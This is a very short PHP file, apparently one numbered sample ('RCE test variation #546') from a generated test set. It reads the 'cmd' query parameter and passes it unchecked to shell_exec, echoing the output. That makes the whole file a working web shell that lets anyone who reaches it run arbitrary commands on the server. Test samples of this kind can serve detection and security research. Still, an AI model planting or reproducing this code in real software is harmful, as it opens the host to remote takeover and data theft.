<?php
// RCE test variation #546
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>